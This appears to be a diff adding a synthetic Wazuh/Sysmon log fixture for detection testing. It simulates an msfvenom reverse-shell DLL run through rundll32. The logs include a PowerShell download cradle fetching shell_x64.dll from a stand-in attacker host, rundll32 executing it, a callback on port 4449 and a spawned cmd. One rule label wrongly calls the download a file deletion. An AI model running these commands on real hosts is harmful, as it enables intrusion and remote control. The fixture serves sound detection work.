@@ -1,0 +1,383 @@
+{
+  "_metadata": {
+    "attack_id": "T1218.011",
+    "variation": "002",
+    "name": "MSFVenom x64 DLL via Rundll32.exe",
+    "description": "Attacker uses rundll32.exe (LOLBin) to execute msfvenom x64 reverse shell DLL payload",
+    "expected_detection": "HIGH",
+    "kill_chain_phase": "defense-evasion",
+    "tool": "msfvenom",
+    "format": "wazuh-native",
+    "format_version": "1.0"
+  },
+  "logs": [
+    {
+      "_comment": "Sysmon Event 1 - PowerShell download cradle (x64 DLL)",
+      "sequence": 1,
+      "timestamp": "2026-02-11T03:54:35.000Z",
+      "log": {
+        "timestamp": "2026-02-11T03:54:35.000Z",
+        "rule": {
+          "level": 12,
+          "description": "Powershell was used to delete files or directories",
+          "id": "100200",
+          "mitre": {
+            "id": [
+              "T1059.001",
+              "T1071.001"
+            ],
+            "tactic": [
+              "Execution",
+              "Command and Control"
+            ],
+            "technique": [
+              "PowerShell",
+              "Web Protocols"
+            ]
+          },
+          "firedtimes": 1,
+          "mail": false,
+          "groups": [
+            "sysmon",
+            "sysmon_event1",
+            "windows",
+            "powershell"
+          ]
+        },
+        "agent": {
+          "id": "020",
+          "name": "WS01",
+          "ip": "198.51.100.20"
+        },
+        "manager": {
+          "name": "wazuh.manager"
+        },
+        "id": "1707635675.000001",
+        "decoder": {
+          "name": "windows_eventchannel"
+        },
+        "location": "EventChannel",
+        "data": {
+          "win": {
+            "system": {
+              "eventID": "1",
+              "channel": "Microsoft-Windows-Sysmon/Operational",
+              "providerName": "Microsoft-Windows-Sysmon",
+              "computer": "WS01.corp.local",
+              "level": "4",
+              "task": "1",
+              "severityValue": "INFORMATION"
+            },
+            "eventdata": {
+              "utcTime": "2026-02-11 03:54:35.000",
+              "processGuid": "{DLL-PS-GUID-2}",
+              "processId": "5432",
+              "image": "C:\\\\Windows\\\\SysWOW64\\\\WindowsPowerShell\\\\v1.0\\\\powershell.exe",
+              "commandLine": "powershell -Command \\\"Invoke-WebRequest -Uri http://198.51.100.110:8080/shell_x64.dll -OutFile C:\\\\Users\\\\Public\\\\shell_x64.dll\\\"",
+              "currentDirectory": "C:\\\\Windows\\\\System32\\\\",
+              "user": "CORP\\\\Administrator",
+              "integrityLevel": "High",
+              "hashes": "SHA256=POWERSHELL_HASH",
+              "parentProcessGuid": "{PSE-DLL-GUID-2}",
+              "parentProcessId": "4320",
+              "parentImage": "C:\\\\Windows\\\\rxXDFFUI.exe",
+              "parentCommandLine": "C:\\\\Windows\\\\rxXDFFUI.exe"
+            }
+          }
+        }
+      }
+    },
+    {
+      "_comment": "Sysmon Event 1 - rundll32.exe executing x64 DLL",
+      "sequence": 2,
+      "timestamp": "2026-02-11T03:54:39.000Z",
+      "log": {
+        "timestamp": "2026-02-11T03:54:39.000Z",
+        "rule": {
+          "level": 12,
+          "description": "Sysmon - Event 1: Suspicious rundll32.exe execution from Public folder",
+          "id": "100101",
+          "mitre": {
+            "id": [
+              "T1218.011"
+            ],
+            "tactic": [
+              "Defense Evasion"
+            ],
+            "technique": [
+              "Signed Binary Proxy Execution: Rundll32"
+            ]
+          },
+          "firedtimes": 1,
+          "mail": false,
+          "groups": [
+            "sysmon",
+            "sysmon_event1",
+            "windows",
+            "lolbin"
+          ]
+        },
+        "agent": {
+          "id": "020",
+          "name": "WS01",
+          "ip": "198.51.100.20"
+        },
+        "manager": {
+          "name": "wazuh.manager"
+        },
+        "id": "1707635679.000001",
+        "decoder": {
+          "name": "windows_eventchannel"
+        },
+        "location": "EventChannel",
+        "data": {
+          "win": {
+            "system": {
+              "eventID": "1",
+              "channel": "Microsoft-Windows-Sysmon/Operational",
+              "providerName": "Microsoft-Windows-Sysmon",
+              "computer": "WS01.corp.local",
+              "level": "4",
+              "task": "1",
+              "severityValue": "INFORMATION"
+            },
+            "eventdata": {
+              "utcTime": "2026-02-11 03:54:39.000",
+              "processGuid": "{RUNDLL32-X64-GUID}",
+              "processId": "7654",
+              "image": "C:\\\\Windows\\\\System32\\\\rundll32.exe",
+              "commandLine": "rundll32.exe C:\\\\Users\\\\Public\\\\shell_x64.dll,DllMain",
+              "currentDirectory": "C:\\\\Windows\\\\System32\\\\",
+              "user": "CORP\\\\Administrator",
+              "integrityLevel": "High",
+              "hashes": "SHA256=RUNDLL32_X64_HASH",
+              "parentProcessGuid": "{PSE-DLL-GUID-2}",
+              "parentProcessId": "4320",
+              "parentImage": "C:\\\\Windows\\\\rxXDFFUI.exe",
+              "parentCommandLine": "C:\\\\Windows\\\\rxXDFFUI.exe"
+            }
+          }
+        }
+      }
+    },
+    {
+      "_comment": "Sysmon Event 7 - Unsigned x64 DLL loaded by rundll32.exe",
+      "sequence": 3,
+      "timestamp": "2026-02-11T03:54:39.358Z",
+      "log": {
+        "timestamp": "2026-02-11T03:54:39.358Z",
+        "rule": {
+          "level": 10,
+          "description": "Sysmon - Event 7: Unsigned Image loaded by C:\\\\Windows\\\\System32\\\\rundll32.exe",
+          "id": "100111",
+          "mitre": {
+            "id": [
+              "T1218.011"
+            ],
+            "tactic": [
+              "Defense Evasion"
+            ],
+            "technique": [
+              "Signed Binary Proxy Execution: Rundll32"
+            ]
+          },
+          "firedtimes": 1,
+          "mail": false,
+          "groups": [
+            "sysmon",
+            "sysmon_event7",
+            "windows"
+          ]
+        },
+        "agent": {
+          "id": "020",
+          "name": "WS01",
+          "ip": "198.51.100.20"
+        },
+        "manager": {
+          "name": "wazuh.manager"
+        },
+        "id": "1707635679.358001",
+        "decoder": {
+          "name": "windows_eventchannel"
+        },
+        "location": "EventChannel",
+        "data": {
+          "win": {
+            "system": {
+              "eventID": "7",
+              "channel": "Microsoft-Windows-Sysmon/Operational",
+              "providerName": "Microsoft-Windows-Sysmon",
+              "computer": "WS01.corp.local",
+              "level": "4",
+              "task": "7",
+              "severityValue": "INFORMATION"
+            },
+            "eventdata": {
+              "utcTime": "2026-02-11 03:54:39.358",
+              "processGuid": "{RUNDLL32-X64-GUID}",
+              "processId": "7654",
+              "image": "C:\\\\Windows\\\\System32\\\\rundll32.exe",
+              "imageLoaded": "C:\\\\Users\\\\Public\\\\shell_x64.dll",
+              "signed": "false",
+              "signature": "-",
+              "signatureStatus": "Unsigned",
+              "hashes": "SHA256=X64_DLL_HASH",
+              "user": "CORP\\\\Administrator"
+            }
+          }
+        }
+      }
+    },
+    {
+      "_comment": "Sysmon Event 3 - Network connection from x64 rundll32.exe to C2",
+      "sequence": 4,
+      "timestamp": "2026-02-11T03:54:40.000Z",
+      "log": {
+        "timestamp": "2026-02-11T03:54:40.000Z",
+        "rule": {
+          "level": 10,
+          "description": "Sysmon - Event 3: Network connection to Uncommon Port by C:\\\\Windows\\\\System32\\\\rundll32.exe",
+          "id": "100103",
+          "mitre": {
+            "id": [
+              "T1095",
+              "T1071"
+            ],
+            "tactic": [
+              "Command and Control"
+            ],
+            "technique": [
+              "Non-Application Layer Protocol",
+              "Application Layer Protocol"
+            ]
+          },
+          "firedtimes": 1,
+          "mail": false,
+          "groups": [
+            "sysmon",
+            "sysmon_event3",
+            "windows"
+          ]
+        },
+        "agent": {
+          "id": "020",
+          "name": "WS01",
+          "ip": "198.51.100.20"
+        },
+        "manager": {
+          "name": "wazuh.manager"
+        },
+        "id": "1707635680.000001",
+        "decoder": {
+          "name": "windows_eventchannel"
+        },
+        "location": "EventChannel",
+        "data": {
+          "win": {
+            "system": {
+              "eventID": "3",
+              "channel": "Microsoft-Windows-Sysmon/Operational",
+              "providerName": "Microsoft-Windows-Sysmon",
+              "computer": "WS01.corp.local",
+              "level": "4",
+              "task": "3",
+              "severityValue": "INFORMATION"
+            },
+            "eventdata": {
+              "utcTime": "2026-02-11 03:54:40.000",
+              "processGuid": "{RUNDLL32-X64-GUID}",
+              "processId": "7654",
+              "image": "C:\\\\Windows\\\\System32\\\\rundll32.exe",
+              "user": "CORP\\\\Administrator",
+              "protocol": "tcp",
+              "initiated": "true",
+              "sourceIsIpv6": "false",
+              "sourceIp": "198.51.100.20",
+              "sourceHostname": "WS01",
+              "sourcePort": "51108",
+              "sourcePortName": "-",
+              "destinationIsIpv6": "false",
+              "destinationIp": "198.51.100.110",
+              "destinationHostname": "-",
+              "destinationPort": "4449",
+              "destinationPortName": "-"
+            }
+          }
+        }
+      }
+    },
+    {
+      "_comment": "Sysmon Event 1 - cmd.exe spawned by malicious x64 DLL",
+      "sequence": 5,
+      "timestamp": "2026-02-11T03:54:40.100Z",
+      "log": {
+        "timestamp": "2026-02-11T03:54:40.100Z",
+        "rule": {
+          "level": 12,
+          "description": "Windows command prompt started by an abnormal process",
+          "id": "100150",
+          "mitre": {
+            "id": [
+              "T1059.003"
+            ],
+            "tactic": [
+              "Execution"
+            ],
+            "technique": [
+              "Windows Command Shell"
+            ]
+          },
+          "firedtimes": 1,
+          "mail": false,
+          "groups": [
+            "sysmon",
+            "sysmon_event1",
+            "windows"
+          ]
+        },
+        "agent": {
+          "id": "020",
+          "name": "WS01",
+          "ip": "198.51.100.20"
+        },
+        "manager": {
+          "name": "wazuh.manager"
+        },
+        "id": "1707635680.100001",
+        "decoder": {
+          "name": "windows_eventchannel"
+        },
+        "location": "EventChannel",
+        "data": {
+          "win": {
+            "system": {
+              "eventID": "1",
+              "channel": "Microsoft-Windows-Sysmon/Operational",
+              "providerName": "Microsoft-Windows-Sysmon",
+              "computer": "WS01.corp.local",
+              "level": "4",
+              "task": "1",
+              "severityValue": "INFORMATION"
+            },
+            "eventdata": {
+              "utcTime": "2026-02-11 03:54:40.100",
+              "processGuid": "{CMD-X64-GUID}",
+              "processId": "8765",
+              "image": "C:\\\\Windows\\\\SysWOW64\\\\cmd.exe",
+              "commandLine": "cmd",
+              "currentDirectory": "C:\\\\Windows\\\\System32\\\\",
+              "user": "CORP\\\\Administrator",
+              "integrityLevel": "High",
+              "hashes": "SHA256=CMD_HASH",
+              "parentProcessGuid": "{RUNDLL32-X64-GUID}",
+              "parentProcessId": "7654",
+              "parentImage": "C:\\\\Windows\\\\System32\\\\rundll32.exe",
+              "parentCommandLine": "rundll32.exe C:\\\\Users\\\\Public\\\\shell_x64.dll,DllMain"
+            }
+          }
+        }
+      }
+    }
+  ]
+}
